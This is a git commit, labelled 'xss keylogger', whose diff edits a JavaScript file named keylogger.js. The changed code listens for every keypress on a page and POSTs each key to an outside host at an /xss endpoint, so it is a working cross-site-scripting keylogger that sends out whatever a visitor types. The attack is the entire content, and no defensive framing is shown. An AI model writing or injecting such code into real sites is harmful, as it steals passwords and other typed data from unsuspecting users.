1cf5b97791af7c62c0740e4aaa554c93e371714a
Duy Nguyen <duy210697@gmail.com>
2019-03-03 03:06:30 +0700

    2019-03-03: xss keylogger

--- public/js/keylogger.js
+++ public/js/keylogger.js
@@ -2,20 +2,26 @@
 function ajaxRequest (method, url, data) {
     var xmlHttp = new XMLHttpRequest()
 
-    xmlHttp.open(method, url, true)
-
-    // xmlHttp.setRequestHeader("Content-type", "application/json");
-    xmlHttp.send(data)
-
     xmlHttp.onreadystatechange = function() {
         if (this.readyState == 4 && this.status == 200) {
             console.log(this.responseText);
         }
     };
 
+    if (xmlHttp.overrideMimeType) {
+        xmlHttp.overrideMimeType('application/json')
+    }
+
+    xmlHttp.open(method, url, true)
+    // xmlHttp.setRequestHeader('Content-Type', 'application/json');
+
+    // xmlHttp.setRequestHeader("Content-type", "application/json");
+    // xmlHttp.setRequestHeader('Access-Control-Allow-Headers', '*');
+    // xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xmlHttp.send(data)
     return xmlHttp
 }
 
 document.addEventListener('keypress', function (e) {
-    ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', 'hello')
+    ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', '{"key":' + e.key + '}')
 })
